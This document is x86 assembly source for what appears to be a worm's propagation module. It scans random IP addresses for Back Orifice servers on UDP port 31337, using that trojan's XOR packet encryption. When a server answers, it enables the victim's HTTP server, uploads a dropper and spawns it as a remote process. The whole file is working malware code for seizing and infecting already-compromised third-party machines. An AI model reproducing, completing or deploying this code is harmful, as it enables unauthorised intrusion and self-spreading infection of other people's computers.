;BO scanning

PORT     EQU 31337
BUFFSIZE EQU 512



getkey:
IF FIXED_BO_PSW EQ FALSE
       pushad
       mov esi, ofs g_password
       push esi
       sub ebx, ebx
       mov ecx,-1
  @@count:
       inc ecx
       lodsb
       movsx eax,al
       add ebx,eax                ;z+= g_password[x];
       test eax,eax
       jnz @@count
  @@done_count:
       pop esi
       test ecx,ecx
       jnz @@psw
       mov ebx,31337
       jmp @@return

  @@psw:
       sub ebp,ebp
  @@chksum:
       lodsb
       movsx eax,al
       lea edx,[ecx+1]
       imul eax,edx
       bt ebp,0
       jnc @@odd
       sub ebx,eax
       jmp @@adjust
  @@odd:
       add ebx,eax
  @@adjust:
       and ebx, 7fffh             ;z = z%RAND_MAX;
       inc ebp
       loop @@chksum

  @@done_chksum:
       imul ebx,ebp               ;z = (z * y)%RAND_MAX
       and ebx, 7fffh
  @@return:
       mov [bo_seed],ebx
       popad
ELSE
       mov [bo_seed],31337
ENDIF
       ret



BOcrypt:                                ;size@4/buffer@8
       pushad
       mov ecx, [esp.cPushad.Arg1]
       mov esi, [esp.cPushad.Arg2]
       test ecx,ecx
       jz @@done
       call getkey
  @@crypt:
       mov eax,[bo_seed]
       imul eax,eax,214013
       add eax,2531011
       mov [bo_seed],eax
       shr eax,8

       lodsb
       xor al,ah
       mov [esi-1],al
       loop @@crypt
  @@done:
       popad
       ret 4*2



sendping:
       pushad
       sub esp, (MAGICSTRINGLEN+(4*2)+2)+16+BUFFSIZE

       mov esi,esp
       mov edi,esi

;header(2D)+size_of_packet(D)+count(D)+TYPE(B)
       mov eax,"Q*!*"
       stosd
       mov eax,"?YTW"
       stosd

       mov eax, MAGICSTRINGLEN+(4*2)+2
       stosd
       mov eax,-1
       stosd
       mov eax, TYPE_PING
       stosw                    ;+0

       push esi
       push MAGICSTRINGLEN+(4*2)+2
       call BOcrypt

       mov ebx,edi
       mov eax, AF_INET
       stosw
       mov eax, PORT
       xchg al,ah
       stosw
       call gen_ip
       stosd
       sub eax,eax
       stosd
       stosd

       push IPPROTO_UDP
       push SOCK_DGRAM
       push AF_INET
       call [_socket]
       push eax

;sendto(sock, buff, size, 0, (struct sockaddr *)&host, sizeof(host))
       push 16
       push ebx
       push 0
       push MAGICSTRINGLEN+(4*2)+2
       push esi
       push eax
       call [_sendto]

       mov esi,[esp]          ;esi==socket

       push esi
       push 1
       mov eax,esp

       push 0
       push 4                   ;wait 4 seconds

       push esp
       push 0
       push 0
       push eax
       push 0
       call [_select]

       add esp,4*4

       dec eax
       jnz @@error

;recvfrom(sock, buff, BUFFSIZE, 0, (struct sockaddr *)&host, &hostsize)
       push 0
       push 0
       push 0
       push BUFFSIZE
       push edi
       push esi
       call [_recvfrom]

       push edi
       push eax
       call BOcrypt

       xchg esi, edi                    ;edi==socket
       lodsd
       sub eax,"Q*!*"
       jnz @@error
       lodsd
       sub eax,"?YTW"
       jnz @@error

       cmp by [esi+8],TYPE_PING
       jnz @@error

       mov eax,[ebx.sin_addr]
       mov [bo_ip],eax

       sub esp,200h
       mov esi,esp

       push ofs bo_null
       push ofs bo_registry
       push TYPE_REGISTRYENUMVALS
       call sendpacket

  @@reg_redo:
       call getinput
       test eax,eax
       jnz @@error_esp
       cmp dwo [esi],   'ratS'
       jne @@reg_checkend
       cmp dwo [esi+4], '(put'
       jne @@reg_checkend
       push edi
       mov edi,esi
       push esi

  @@bo_reg_start:
       lodsb
       sub al, "'"
       jnz @@bo_reg_start

  @@reg_copy:
       lodsb
       cmp al, "'"
       jne @@bo_reg_skip
       sub eax,eax
  @@bo_reg_skip:
       stosb
       test al,al
       jnz @@reg_copy

       pop esi
       add esi, 100h
       pop edi

  @@reg_checkend:
       cmp dwo [esi],'fo d'             ;"End of..."
       jne @@reg_redo

       lea eax,[esi-100h]
       push eax
       push ofs bo_port
       push TYPE_HTTPENABLE
       call sendpacket
       call getinput

       push 1*1000
       call [_Sleep]                      ;wait remote HTTP server startup

       pushad
       sub esp, 200h
       mov esi, esp

       push IPPROTO_IP
       push SOCK_STREAM
       push AF_INET
       call [_socket]
       mov ebx, eax

       push 0
       push 0
       push dwo [bo_ip]
       push 09a020002h
       mov eax, esp

       push 10h
       push eax
       push ebx
       call [_connect]
       add esp, 4*4
       test eax, eax
       jnz @@error_http

       push 0
       push bo_http_header_size
       push ofs bo_http_header
       push ebx
       call [_send]

       push 0
       push dwo [bo_dropsize]
       push dwo [bo_dropper]
       push ebx
       call [_send]

       mov eax,esp
       push 0
       push 200h
       push eax
       push ebx
       call [_recv]

;       push 2                           ;SD_BOTH
;       push ebx
;       call [_shutdown]

  @@error_http:
       push ebx
       call [_closesocket]

       push 3*1000
       call [_Sleep]                      ;wait da stuff complete

       add esp, 200h
       popad

       push ofs bo_null
       push ofs bo_null
       push TYPE_HTTPDISABLE
       call sendpacket
       call getinput

       sub esi, 100h

       push ofs bo_null
       push esi

       pushad
  @@bo_search_endz:
       lodsb
       test al,al
       jnz @@bo_search_endz
       mov by [esi-1],'\'
       mov edi, ofs bo_name
       xchg edi,esi
  @@bo_copy_name:
       lodsb
       stosb
       test al,al
       jnz @@bo_copy_name
       popad

       push TYPE_PROCESSSPAWN
       call sendpacket
       call getinput

  @@error_esp:
       add esp, 200h

  @@error:
       call [_closesocket]

       add esp, (MAGICSTRINGLEN+(4*2)+2)+16+BUFFSIZE
       popad
       ret



sendpacket:             ;type/arg1/arg2
       pushad                          ;ebx==sock/edi==socket

       mov esi,[esp.cPushad.Arg2]
       push esi
       mov esi,[esp.cPushad.Arg3.Pshd]
       call @@strlen
       mov eax,ecx
       pop esi                          ;esi==arg1
       call @@strlen

       lea ebp,[eax+ecx+8+(4*2)+3]

       push ebp
       push 40h
       call [_GlobalAlloc]
       test eax,eax
       jz @@done

       push eax
       mov edi, eax

;size = MAGICSTRINGLEN + (sizeof(long)*2) + 3 + strlen(str1) + strlen(str2)
       mov eax,"Q*!*"
       stosd
       mov eax,"?YTW"
       stosd

       mov eax, ebp
       stosd
       mov eax,-1
       stosd
       mov eax, [esp.cPushad.Arg1.Pshd]
       stosb

       call @@strlen
       rep movsb
       sub eax,eax
       stosb

       mov esi,[esp.cPushad.Arg3.Pshd]
       call @@strlen
       rep movsb

       push dwo [esp]
       push ebp
       call BOcrypt

;sendto(sock, buff, size, 0, (struct sockaddr *)&host, sizeof(host)
       push 16
       push dwo [esp.Pushad_ebx.Pshd.Pshd]         ;Pushad_ebx
       push 0
       push ebp
       push dwo [esp.(Pshd*4)]               ;[esp]
       push dwo [esp.Pushad_edi.(Pshd*6)]           ;pushad_edi
       call [_sendto]

  @@done_free:
       call [_GlobalFree]

  @@done:
       popad
       ret 3*4

  @@strlen:
       push eax
       push esi
       sub ecx,ecx
       test esi,esi
       jz @@strlen_done
  @@strlen666:
       lodsb
       test al,al
       jz @@strlen_done
       inc ecx
       jmp @@strlen666
  @@strlen_done:
       pop esi
       pop eax
       ret



getinput:
       pushad                           ;esi==outbuffer/edi==socket
       sub esp, BUFFSIZE
       mov edi,esp

       mov dwo [esi],0

       mov esi, dwo [esp.Pushad_edi+BUFFSIZE]          ;pushad_edi

       push esi
       push 1
       mov eax,esp

       push 0
       push 4                   ;wait 4 seconds

       push esp
       push 0
       push 0
       push eax
       push 0
       call [_select]

       add esp,4*4

       dec eax
       jnz @@error

;recvfrom(sock, buff, BUFFSIZE, 0, (struct sockaddr *)&host, &hostsize)
       push 0
       push 0
       push 0
       push BUFFSIZE
       push edi
       push esi
       call [_recvfrom]

       push edi
       push eax
       call BOcrypt

       xchg esi, edi                    ;edi==socket
       lodsd
       sub eax,"Q*!*"
       jnz @@error
       lodsd
       sub eax,"?YTW"
       jnz @@error

       add esi,11
       mov edi,[esp.Pushad_esi+BUFFSIZE]
  @@bo_cpy:
       lodsb
       stosb
       test al,al
       jnz @@bo_cpy

       sub eax,eax
  @@error:
       add esp, BUFFSIZE
       mov [esp.Pushad_eax],eax
       popad
       ret



gen_ip:
       pushad
  @@get_ip:
       call random_ip_byte
       mov bh, al          ; d
       call random_ip_byte
       mov bl, al          ; c
       shl ebx, 16
       call random_ip_byte
       mov bh, al          ; b
       call random_ip_byte
       mov bl, al          ; a

       call random_eax
       and eax, 7
       mov eax, [ofs ip_mask_table+eax*4]

       and ebx, eax
       not eax
       and eax, [this_ip]
       or ebx, eax

       cmp bl, 127
       je @@get_ip

       cmp ebx, [this_ip]
       je @@get_ip

       mov [esp+7*4],ebx
       popad
       ret


random_eax:
       push 0
       call rnd
       ret


random_ip_byte:
       call random_eax
       cmp al, 0
       je random_ip_byte
       cmp al, 255
       je random_ip_byte
       ret

get_current_ip:
       pushad
       sub esp, 200h
       mov esi, esp

       push 200h
       push esi
       call [_gethostname]

       push esi
       call [_gethostbyname]
       mov eax, [eax].dword ptr 16
       mov eax, [eax]       ; [eax+4]
       mov [this_ip], eax

       sub esp, -200h
       popad
       ret

